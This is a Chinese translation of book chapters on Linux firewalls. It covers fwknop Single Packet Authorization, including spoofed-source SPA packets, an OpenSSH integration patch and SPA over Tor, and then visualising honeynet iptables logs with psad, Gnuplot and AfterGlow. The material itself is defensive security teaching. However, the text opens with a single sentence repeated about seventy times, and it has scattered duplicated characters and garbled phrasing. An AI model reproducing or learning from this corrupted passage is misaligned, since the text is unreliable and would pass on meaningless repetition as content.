系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。

在图 13-3 中，`spaclient` 系统发送了 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了，使其看起来源自 `207.132.*X*`。当 `fwknopd` 运行在 `spaserver` 上时，它嗅探线缆上的数据包，但授予的是真实 IP `204.23.*` 的访问，而不是伪造的源地址 `207.132.*X*`。

![来自伪造源地址的 SPA 数据包](img/httpatomoreillycomsourcenostarchimages20714.png)

图 13-3. 来自伪造源地址的 SPA 数据包

注意下方的 `fwknop` 客户端命令变得更加复杂。这是为了以 root 身份伪造 SPA 包的 IP，同时使用 `fwknop_client` 密钥构建加密载荷，该密钥由 `mbr` 用户所有并位于 `/home/mbr/.gnupg`。

```
 [root@spaclient ˜]$ fwknop --Spoof-src 207.132.X.X -A tcp/22 --gpg-home-dir /home/mbr/.gnupg --Spoof-user mbr --gpg-recip "fwknop_server" --gpg-sign "fwknop_client" --quiet -R -k spaserver
GnuPG signing password:
```

下面的系统日志消息表明 `fwknop` 服务器嗅到了 SPA 数据包，其源自❶伪造的源地址 `207.132.*X*`，但授予的是加密包中的 IP 地址 ❷204.23.*.**`。

```
 [root@spaserver ˜]# tail /var/log/messages
 Oct 18 23:31:37 spaserver fwknopd: received valid GnuPG encrypted packet (signed with
required key ID: "fwknop_client") from: 207.132.X.X, remote user: mbr
 Oct 18 23:31:37 spaserver fwknopd: adding FWKNOP_INPUT ACCEPT rule for ❷204.23.*X.**
X -> tcp/22 (30 seconds)
```

## fwknop OpenSSH 集成补丁

`fwknop` 项目希望让 SPA 的使用尽可能简单和友好。减轻用户负担的一种方法是与各种客户端应用程序无缝集成。由于 SPA 最常见的应用是保护 SSH 通信，`fwknop` 针对 OpenSSH 源码提供了一个补丁，允许从 SSH 客户端命令行直接执行 `fwknop` 客户端。要使此功能生效，你首先需要对 OpenSSH 源码应用补丁并重新编译。以下说明了如何对 OpenSSH-4.3p2 版本进行操作，假设源码位于 `/usr/local/src`。





```
 $ cd /usr/local/src/openssh-4.3p2
$ wget http://www.cipherdyne.org/LinuxFirewalls/ch13/openssh-4.3p2_SPA.patch
$ patch -p1 < openssh-4.3p2_SPA.patch
patching file config.h.in
patching file configure
patching file configure.ac
patching file ssh.c
$ ./configure --prefix --with-spa-mode && make
$ su -
Password:
# cd /usr/local/src/openssh-4.3p2
# make install
```

上述命令最重要的注意点点是，`configure` 脚本的 `--with-spa-mode` 参数确保了在编译 OpenSSH 时包含了 SPA 补丁代码。

现在，在安装了修改过的 SSH 客户端后，可以直接从 SSH 命令行调用 `fwknop` 客户端，而不再需要在使用用 SSH 建立连接之前手动运行 `fwknop`。该补丁为 SSH 添加了新的命令行参数 `-K` `fwknop args`；该参数可以如下所示，在无需单独运行 `fwknop` 客户端的情况下访问 spaserver 系统。

```
 [mbr@spaclient ˜]$ ssh -K "--gpg-recip ABCD1234 --gpg-sign DEFG5678 -A tcp/22 -R -k
spaserver" mbr@spaserver
GnuPG signing password:
Password:
Last login: Wed Oct 17 15:48:19 2007 from spaclient
[mbr@spaserver ˜]$
```

`fwknop` 服务端常见的日志消息表示已收到 SPA 包，并确认数据包检查通过（即：使用所需的密钥 ID 进行加密，且没有在网络上被重放）。

```
 Oct 17 15:53:39 spaserver fwknopd: received valid GnuPG encrypted packet
 (signed with required key ID: A742839F) from: 204.23.X.X, remote user: mbr
Oct 17 15:53:39 spaserver fwknopd: adding FWKNOP_INPUT ACCEPT rule for 204.23.X.X
-> tcp/22 (30 seconds)
```

新的 SSH `-K` 选项将其参数传递给 `fwknop` 命令行，因此 `fwknop`提供的所有功能都暴露在 SSH 命令行中。这包括 `-L` `host` 参数，正如本章前面提到的，该参数允许对之前使用的 fwknop 命令行作用于同一主机。因此，以下命令可以正常工作。

```
 ssh -K "-L host" user@host
```

## 运行 Tor 的 SPA

*洋葱路由（Tor）* 是一种由全球分布的节点（称为洋葱路由器）组成的匿名网络（请参见 [`tor.eff.org`](http://tor.eff.org)）。Tor 网络旨在加强基于 TCP 的服务，免受一种名为*流量分析*（traffic analysis）的互联网监控。*流量分析*用于确定在互联网上谁在和谁通信，任何能够访问互联网流量的组织（特别是 ISP）都可以轻松部署它。即使是加密的应用流量也会受到流量分析的影响，因为 IP 地址是明文传输的。

### 注意事项

我在这里没有考虑 IPSEC 或其他 VPN 协议，但即使这些协议也可以通过流量分析泄露信息。

仅仅通过观察双方通信就能获取的信息往往被低估了，这影响到从保护密码安全到揭露所谓匿名转发器身份的方方面。

Tor 的工作原理是为每个 TCP 连接通过路由器云建立一个独立的虚拟电路。虚拟电路建立在*入口路由器*（entry router）和随机选择的*出口路由器*（exit router）之间。每个电路都是唯一的，电路中的每个跳节点只知道流量来源跳节点和流量必须发送到的跳节点。此外，流量在路由器云内部是经过加密的。

最终结果是，客户端可以通过此虚拟电路在开放的互联网上与服务器通信，而任何可以监控进入或离开路由器云流量的第三方都将看到看似完全无关的 IP 地址在相互通信。

在 Tor 网络上发送 SPA 包有好处吗？答案肯定的，因为它扩展了 `fwknop` 的服务隐藏特性，使得更难判断服务器位置是否正在使用 SPA。

但有一个陷阱：Tor 使用 TCP 进行传输。这意味着 Tor 与 SPA 不兼容，因为 SPA 包默认通过 UDP 传输。尽管 `fwknop` 支持通过盲目 TCP ACK 包发送 SPA 包，但仅凭这一点不足以让 SPA 包跨越 Tor 网络。只有在与入口路由器的初始 TCP 连接完全建立后，才会通过 Tor 内部创建一个虚拟电路，这意味着需要双向通信。

`fwknop` 通过打破 SPA 的单包特性，并通过与 `fwknop_serv` 守护进程建立完全建立的 TCP 连接发送 SPA 包来解决这个问题。该守护进程产生一个以 `nobody` 用户身份运行的极简 TCP 服务器，在 TCP 端口 `62201` 上执行 `bind()` 和 `listen()`，然后循环调用 `accept()`。在每次 `accept()` 之后，都会进行一次 `recv()`，以便在会话关闭之前，客户端只能跨越连接发送单个 TCP 分分段。这允许客户端通过建立的 TCP 连接发送 SPA 负载，但不发送其他任何内容。然后，通过使用 `socat` 程序（它作为 Tor 所需的 `socks4` 代理）结合 `fwknop` 命令行上的 `--TCP-sock` 参数，就可以通过 Tor 网络发送 SPA 包了。

### 注意事项

有关 `socat` 的更多信息，请参见 [`www.dest-unreach.org/socat`](http://www.dest-unreach.org/socat)。

# 结语

本章和[第 12 章]说明了计算机安全中的强大技术，展示了服务器如何通过默认丢弃数据过滤器受到保护，只有能够向被动监控设备证明其身份的客户端才能获得访问。端口触发（Port knocking）是实现这一想法第一个技术，但由于端口触发架构存在一些严重的局限性（包括充分解决重放问题的困难以及无法传输超过几十字节的数据），SPA 证明自己是一种更健壮的技术。授权以太网嗅探器结合默认丢弃数据过滤器的概念在计算机安全领域是一个新概念，但似乎新的实现方案每天都在涌现。

基于 `iptables`，`fwknop` 是 SPA 的开源实现，提供了一种在 SPA 范式内管理多个用户的灵活机制。




甚至有一个项目尝试将基于 HMAC 的 SPA 直接放入 iptables 中；请参见 [`svn.berlios.de/svnroot/repos/portknocko`](http://svn.berlios.de/svnroot/repos/portknocko) 以及 Netfilter 开发列表存档中的一个讨论线程：[`lists.netfilter.org/pipermail/netfilter-devel/2006-october/thread.html`](http://lists.netfilter.org/pipermail/netfilter-devel/2006-october/thread.html)。

# 第 14 章 IPTABLES 日志的可视化

在当今开放互联网的威胁环境中，安全数据的可视化变得越来越重要。从入侵检测系统到防火墙，安全设备在处理来自全球各地的攻击时，会产生大量的事件数据。理解这些海量数据是一项巨大的挑战。安全数据的图形化表示允许管理员快速看到新兴趋势和异常活动，而这些如果没有专门的代码很难检测到。也就是说，图表在传达 `context`（上下文）和 `change`（变化）方面非常有效，因为人眼可以快速察觉其他情况下难以发现的关系。

本章探索了如何结合 Gnuplot ([`www.gnuplot.info`](http://www.gnuplot.info)) 和 AfterGlow ([`afterglow.sourceforge.net`](http://afterglow.sourceforge.net)) 项目使用 `psad` 来生成 iptables 日志数据的图形化表示。我们的主要数据源将来自 Honeynet Project 的 `iptables` 日志（参见 [`www.honeynet.org`](http://www.honeynet.org)）。

Honeynet Project 是安全社区无价的资源；它公开发布原始安全数据，例如从受攻击的活跃 honeynet 系统收集的 Snort 告警和 `iptables` 日志。Honeynet Project 的首要目标是通过一系列“扫描挑战”让这些安全数据可供分析，这些挑战的结果会发布在 Honeynet Project 网站上。在本章中，我们将视觉化来自 Scan34 Honeynet 挑战的数据（参见 [`www.honeynet.org/scans/scan34`](http://www.honeynet.org/scans/scan34)）。你可以从 [`www.cipherdyne.org/linuxfirewalls`](http://www.cipherdyne.org/linuxfirewalls) 下载本章提到的所有图表和 Gnuplot 指令文件。

### 注意

本章中的所有示例假设当前目录下的 Scan34 `iptables` 数据文件名为 `iptables.data`。

# 观察异常情况

考虑以下组数字：

```
 5, 4, 2, 1, 3, 4, 55, 58, 70, 85, 120, 9, 2, 3, 1, 5, 4
```

该数据集代表一个特定 IP 地址每分钟连接的 TCP 或 UDP 端口数量；这些信息可以通过解析 `iptables` 日志数据获取。注意数据集中的峰值，端口数量从 4 迅速增加到 120，然后回到 1 到 5 之间的稳定状态。

当使用 Gnuplot 对这些数据进行图形化表示时（如 图 14-1 所示），峰值是一而易见的。

![每分钟到端口的数据包数量](img/httpatomoreillycomsourcenostarchimages207384.png)

图 14-1. 每分钟到端口的数据包数量

端口扫描是这种峰值的一种可能解释。其他解释可能是 `iptables` 策略配置不当，记录了良流量，或者错误地记录了作为已建立连接部分的 TCP ACK 包。峰值的实际解释在这里并不重要——重要的是这个峰值是 `unusual`（异常的）。图表可以容易且快速地显示现状的剧变，并让你将精力集中在那些问题区域上。

在前面的示例中，在如此小规模的数据集中看出模式相对容易。现在，假设你面对的是一个由 1,000 或 100,000 个数字组成的类似数据集。除非这些数据被制图，否则用肉眼从这么多数据中提取趋势是一项艰巨的挑战。

图 14-2 是一个包含超过 800 个点的图表，记录了 `iptables` 策略在约五周时间内以每小时一个数据点的速率记录的 TCP SYN 包数量。数据源来自 Scan34 Honeynet 扫描挑战的 `iptables` 日志文件，并使用 `psad` 解析数据以供 Gnuplot 渲染。

![每小时到端口的 SYN 包数量](img/httpatomoreillycomsourcenostarchimages207382.png)

图 14-2. 每小时到端口的 SYN 包数量

如你所示，很容易从图表中选出感兴趣的区域。x 轴分为单独的小时，并以周为单位进行标记；y 轴显示到端口的数据包数量，并以 500 为增量进行标记。3 月 27 日的大峰值迅速引导你关注一个值得更仔细检查的时间段。

¹ 这可能是因为关闭 TCP 连接周围的定时问题引起的。特别是，Netfilter 连接跟踪子系统对处于 CLOSE-WAIT 状态的 TCP 连接设置了 60 秒定时器（参见内核源码中 `linux/net/ipv4/netfilter/ip_conntrack_proto_tcp.c` 文件中的 `ip_ct_tcp_timeout_close_wait` 变量），但有时定时器过期后后续的 TCP ACK 包（通过 CLOSING 和 LAST-ACK 状态完成连接）可能仍在途中。这导致 TCP ACK 包不被视为现有连接的一部分，因此默认的 `iptables` `LOG` 和 `DROP` 规则可能会生效。

## Gnuplot

Gnuplot 项目可以生成许多类型的图表，从直方图到彩色的三维表面图。它擅长处理大型数据集，例如源自数十万行 `iptables` 日志数据的点集。

对于本章中 `iptables` 日志数据的可视化，我们使用 Gnuplot 生成二维和三维的点图和折线图。Gnuplot 需要格式化后的数据作为输入，它本身不具备解析 `iptables` 日志消息的机制。Gnuplot 的理想输入是一个包含列排列的整数值的文件——每列对应二维或三维图中的一个轴。这正是 `psad` 及其 `--gnuplot` 模式发挥用场的地方。在这种模式下，`psad` 解析 `iptables` 日志数据并将结果写入供 Gnuplot 处理的文件。

为了在你的 Linux 系统上复制本章中的图表（或为你自己的 `iptables` 数据生成新图表），你需要安装 `psad` 和 Gnuplot。

## Gnuplot 绘图指令

Gnuplot 在绘制数据图时遵循一系列配置指令。这些指令描述了渲染细节，如图表类型、坐标范围、输出模式（例如，到图形文件或终端）、轴标签和图标题。每条指令都可以通过在命令行提示符输入 `gnuplot` 进入 Gnuplot 交互式 shell 来设置，或者通过 Gnuplot 加载的文件设置。例如，图 14-2 中的每小时端口数据是通过以下 Gnuplot 指令文件绘图的：

```
$ cat fig14-2.gnu
reset
❶ set title "psad iptables log visualization: timestamp dp:counthour"
❷ set terminal png nocrop enhanced
set output "fig14-2.png"
❸ set xdata time
set timefmt x "%s"
set format x "%m/%d"
set xlabel "time"
❹ set xrange ["1140887484":"1143867180"] evenset ylabel "dp:counthour"
set yrange [0:3000]
❺ plot 'fig14-2.dat' using 1:2 with lines
```

fig14-2.gnu 文件中最重要的指令如下：

**`set title`**

位于 ❶ 处的图标题在本例中是由 `psad` 设置的，正如我们在下一节所示。

**`set terminal`**



❷ 处的终端设置和输出文件，如果你希望 Gnuplot 启动一个交互式窗口以便在图表上移动光标，则该部分可以省略。（这在查看复杂数据集时很有帮助。）

`set xdata time`

❸ 处的时间设置，以及后续两行中的时间输入和输出格式，这些设置告诉 Gnuplot 每个点的 x 坐标是一个时间值。

`set xrange`

❹ 处的 x 轴范围，在此情况下，它被设置为 Scan34 数据集的起始值和结束值。（时间值是自 Unix 纪元（1970 年 1 月 1 日 00:00 UTC）以来的秒数。）

`plot`

❺ 处的 `plot` 设置是最重要的 Gnuplot 指令，因为它告诉 Gnuplot 原始数据所在以及如何将其绘图化。在这种情况下，一个二维线图是由 `fig14-2.dat` 文件中的数据构成的。我们在本章中还将看到的其他绘图样式包括二维和三维的散点图（`splot` 指令会将 Gnuplot 置于三维模式）。`using 1:2` 字符串指定了 `fig14-2.dat` 文件中绘图的列数；在三维模式下，`using 1:2:3`  Gnuplot 将第 1、2、3 列作为 x、y、z 轴绘图。

## 结合 psad 和 Gnuplot

如第 6 章和第 7 章所示，psad 提供的核心功能之一是解析和解释 iptables 日志消息的能力。通过使用一系列命令行开关，psad 的解析能力可以与 Gnuplot 的绘图能力相结合。

这些开关中最重要的是 `--gnuplot`。额外的命令行参数为 psad 解析 iptables 日志数据以及构建 Gnuplot 数据输入文件的方式增加了可配置性，这些选项如下：

`--CSV-fields`

设置从 iptables 日志文件中提取的字段。常用的字段有 `src`、`dst`、`dp` 和 `proto`（它们分别映射到 iptables 日志消息中的 `SRC`、`DST`、`DPT` 和 `PROTO` 字段）。每个 `--CSV-fields` 接受一个额外的匹配标准，允许排除或包含特定值。例如，仅当源 IP 地址位于 192.168.50.0/24 子网内、目的 IP 地址位于 10.100.10.0/24 子网内且目的端口为 80 时包含数据点，你可以使用 `--CSV-fields "src:192.168.50.0/24 dst:10.100.10.0/24 dp:80"`。此外，支持通过字符串 `countday`、`counthour` 和 `countmin` 对三个时间跨度（天、小时或分钟）进行字段计数。

`--CSV-regex`

对原始 iptables 日志字符串进行正则表达式匹配，只有当正则表达式匹配时，才包含消息中的字段。例如，为了要求 fwsnort 日志前缀为 `SID*nnn*`（参见第 10 章），其中 *nnn* 是任意三位数字，你可以使用 `--CSV-regex "SID\d{3}"`。`--CSV-neg-regex` 命令行参数也支持否定正则表达式。

`--gnuplot-graph-style`

设置 Gnuplot 绘图样式。可能的值包括线（lines）、点（dots）、散点（points）和线点（linespoints）。

`--gnuplot-file-prefix`

设置文件前缀名，psad 在解析 iptables 日志数据时创建 `prefix*.dat` 和 `prefix*.gnu` 文件。`prefix*.gnu` 文件包含了用于绘制 `prefix*.dat` 文件数据的 Gnuplot 指令。

# AfterGlow

AfterGlow 专门用于将数据可视化为链接图（link graphs），并且（在最新版本中）树状图（tree maps）。*链接图*是节点和边的表示，用于传节点之间的关系。此类图非常适合显示 IP 地址和端口号等数据。AfterGlow 由安全可视化网站 [`www.secviz.org`](http://www.secviz.org) 的创始人 Raffael Marty 开发，该网站包含了从 SSH 连接到 iptables 策略的所有内容的讨论和可视化示例；多个 AfterGlow 用户为该网站贡献可视化内容。

psad 连接 AfterGlow 的接口与 Gnuplot 的接口类似。对于 AfterGlow，`--CSV-fields` 命令行参数同样重要，用于指定从 iptables 日志文件中提取的字段，且 `--CSV-regex` 和 `--CSV-neg-regex` 参数也适用于正则表达式过滤数据。

例如，为了让 AfterGlow 构建从 11.11.0.0/16 网络向 11.11.0.0/16 网络之外系统的所有出站 SYN 包的链接图，你可以执行以下命令：

```
# psad -m iptables.data --CSV --CSV-fields "src:11.11.0.0/16 dst:not11.11.0.0/16 dp"
--CSV-regex "SYN URGP=" | perl afterglow.pl -c color.nf | neato -Tpng -o webconnections.png
```

上述命令的结果是 `webconnections.png` 图形文件中解析数据的可视化。我们将在本章的稍后部分看到 AfterGlow 生成的链接图示例，但需要注意的一个重要特性是，你可以通过向 AfterGlow 命令行提供配置文件的路径（使用上面的 `-c` 参数）来控制与每个绘图节点相关的颜色。这是一个示例配置文件，它是 AfterGlow 源码提供的默认 `color.properties` 文件的修改版本：

```
# AfterGlow Color Property File
#
# @fields 是包含解析值的数组
# color.source 是源节点的颜色
# color.event 是事件节点的颜色
# color.target 是目标节点的颜色
#
# 第一个匹配者获胜
#
❶ color.source="yellow" if ($fields[0]=˜/^\s*11\.11\./);
color.source="red"
color.event="yellow" if ($fields[1]=˜/^\s*11\.11\./);
❷ color.event="red"
❸ color.target="blue" if ($fields[2]>1024)
color.target="lightblue"
```

AfterGlow 链接图显示了源节点、事件节点和目标节点之间的连接。在上面的示例中，所有源节点都是 11.11.0.0/16 网络内的 IP 地址，它们在 ❶ 处涂为黄色。所有事件节点在 ❷ 处涂为红色（11.11.0.0/16 网络永远不会匹配，因为我们在 psad 命令行通过 `not11.11.0.0/16` 匹配标准将所有事件节点限制为外部地址）。所有大于 1024 的端口在 ❸ 处涂为蓝色，下一行将所有小于或等于 1024 的端口涂为浅蓝色。你可以使用创新的颜色定义为复杂的 AfterGlow 链接图添加有效的视觉辅助。

## iptables 攻击可视化





端口扫描的一个关键特征是扫描器向一个范围内的端口发送数据包。因此，在视觉化海大的 `iptables` 数据集时，将源 IP 地址与向唯一端口发送的数据包数量进行绘图是提取端口扫描活动的好方法。以下 `psad` 的执行使用了 `--CSV-fields "src:not11.11.0.0/16 dp:countuniq"` 命令行参数，将非本地源地址与发送到唯一端口的数据包数量进行绘图：

```
 # psad -m iptables.data --gnuplot --CSV-fields "src:not11.11.0.0/16 dp:countuniq"
--gnuplot-graph points --gnuplot-xrange 0:26500 --gnuplot-file-prefix fig14-3
[+] Entering Gnuplot mode...
[+] Parsing iptables log messages from file: iptables.data
[+] Parsed 179753 iptables log messages.
[+] Writing parsed iptables data to: fig14-3.dat
[+] Writing gnuplot directive file: fig14-3.gnu
$ gnuplot fig14-3.gnu
```

Gnuplot 生成了如图图 14-3 所示的图表。

![源 IP 地址与唯一端口数量对比](img/httpatomoreillycomsourcenostarchimages207416.png)

图 14-3. 源 IP 地址与唯一端口数量对比

正如你在图 14-3 中所示（该图绘制的是单个点而不是绘制连续折线，此选项在上述 `psad` 的执行中以**粗体**显示），你可以看到，绝大多数源地址只向一个或两个唯一端口发送了数据包，尽管少数地址连接了大约 10 个端口。然而，正如你在图表左上角看到的，有一个 IP 地址（在 x 轴约 1000 的范围内）连接了超过 60 个唯一端口；这是整个数据集中最顶端的端口扫描器。

还要注意，端口扫描的时间范围*没有*被纳入图表中。因此，源 IP 地址扫描这 60 个唯一端口的速度快慢并不重要——扫描可能发生在数据集所涵盖的整个五周跨度内，但在图 14-3 中仍然会显示为最顶端的端口扫描器。

### Note

由于 Gnuplot 处理整数数据时效果最好，`psad` 在解析 `iptables` 日志文件时，会将所有 IP 地址映射为唯一的正整数（从 0 开始）。因此，IP 地址 `192.168.3.2` 可能会被映射到类似 `502` 的数字，而 `11.11.79.125` 可能会被映射到 `10201`，这取决于日志文件中唯一地址的数量。对于 Gnuplot 数据文件中的每一行，IP 地址始终作为尾随注释包含在行末。这让你能够看到每个地址映射到了哪个整数。

`psad` 生成的 `fig14-3.dat` 文件顶部包含以下三个数据点：

```
 905, 66  ### 905=60.248.80.102
12415, 10  ### 12415=63.135.2.15
15634, 10  ### 15634=63.186.32.94
```

这告诉我们，主要的端口扫描器是 IP 地址 `60.248.80.102`，总共扫描了 66 个目标端口。接下来的两个糟糕者也只扫描了 10 个唯一端口。

现在让我们为 Scan34 数据集绘制每小时唯一端口数量的图。这将向我们展示是否存在快速的端口扫描，或者扫描器是否在扫描蜜罐网时都试图避开可能正在监控的 IDS 的端口扫描时间阈值：

```
 # psad -m iptables.data --gnuplot --CSV-fields "timestamp
dp:counthouruniq" --gnuplot-graph lines --gnuplot-xrange 1140887484:1143867180
--CSV-neg-regex "SRC=11.11." --gnuplot-yrange 0:100 --gnuplot-file-prefix fig14-4
$ gnuplot fig14-4.gnu
```

执行 Gnuplot 会生成一个每小时到唯一端口连接数量的图。（注意上面**粗体**的，`psad` 命令行中针对目标端口的 `counthouruniq` 指令解析了 Scan34 数据集，以生成此图所需的原始数据。）图 14-4 显示了结果图表，在 3 月 31 日的某个时间，每小时唯一端口的数量出现了巨大的峰值。

![时间与唯一端口对比](img/httpatomoreillycomsourcenostarchimages207455.png)

图 14-4. 时间与唯一端口对比

事实上，这与图 14-3 中看到的顶级端口扫描器 `60.248.80.102` 相对应，正如由 `60.248.80.102` IP 地址产生的第一个和最后一条 `iptables` 日志消息的时间戳所示：

```
 $ grep 60.248.80.102 iptables.data | head -n 1
Mar 31 10:43:28 bridge kernel: INBOUND TCP: IN=br0 PHYSIN=eth0 OUT=br0 PHYSOUT=eth1
SRC=60.248.80.102 DST=11.11.79.125 LEN=40 TOS=0x00 PREC=0x00 TTL=108 ID=123 DF
PROTO=TCP SPT=51129 DPT=4000 WINDOW=16384 RES=0x00 SYN URGP=0
$ grep 60.248.80.102 iptables.data | tail -n 1
Mar 31 10:45:14 bridge kernel: INBOUND UDP: IN=br0 PHYSIN=eth0 OUT=br0 PHYSOUT=eth1
SRC=60.248.80.102 DST=11.11.79.125 LEN=32 TOS=0x00 PREC=0x00 TTL=108 ID=43845 PROTO=
UDP SPT=2402 DPT=256 LEN=12
```

上述第一个日志消息的时间戳是 3 月 31 日上午 10:43，最后一条是同一天的上午 10:45。这告诉我们整个端口扫描只花费了两分钟。

最后，为了获取尽可能多关于 `60.248.80.102` 扫描 IP 地址的信息，你可以使用取证模式下的 `psad` 并使用 `--analysis-fields "src:60.248.80.102"` 命令行参数将其调查范围限制为仅此 IP 地址，如下：

```
 # psad -m iptables.data -A --analysis-fields "src:60.248.80.102"
[+] IP Status Detail:
SRC:  60.248.80.102, DL: 2, Dsts: 1, Pkts: 67, Unique sigs: 3
DST: 11.11.79.125
❶ Scanned ports: UDP 7-43981, Pkts: 53, Chain: FORWARD
❷ Scanned ports: TCP 68-32983, Pkts: 1, Chain: FORWARD
❸ Signature: "POLICY vviewer Javalet download
            TCP, Chain: FORWARD, Count: 1, DP: 5802, Sid: 1846
Signature match: "PSAD-CUSTOM Slammer communication"
            UDP, Chain: FORWARD, Count: 1, DP: 1434, Sid: 100208
Signature match: "RPC portmap listing UDP 32771"
            UDP, Chain: FORWARD, Count: 1, DP: 32771, Sid: 1281
```

`psad` 取证模式的大部分输出已删除，留下了有趣的部分——扫描 TCP 和 UDP 端口范围（❶ 和❷）以及 `60.248.80.102` IP 地址在 `psad` 中触发的签名匹配（❸）。

### Port Sweeps

端口横扫非常有趣，因为它们通常表明蠕虫或人类攻击者正试图通过特定服务的漏洞入侵更多系统。图 14-5 将外部 IP 地址与每个外部地址发送到唯一本地地址的数量进行绘图：

```
 # psad -m iptables.data --gnuplot --CSV-fields "src:❶not11.11.0.0/16 dst:11.11.0.0/16,
❷countuniq" --gnuplot-graph points --gnuplot-xrange 0:26000 --gnuplot-yrange 0:27
--gnuplot-file-prefix fig14-5
$ gnuplot fig14-5.gnu
```

Gnuplot 生成了如图图 14-5 所示的图表。（注意 ❶ 处的 `not` 以排除 `11.11.0.0/16` 网络，以及 ❷ 处的 `countuniq` 指令以计算唯一目标地址。）

![外部源与唯一本地目的地对比](img/httpatomoreillycomsourcenostarchimages207398.png)

图 14-5. 外部源与唯一本地目的地对比





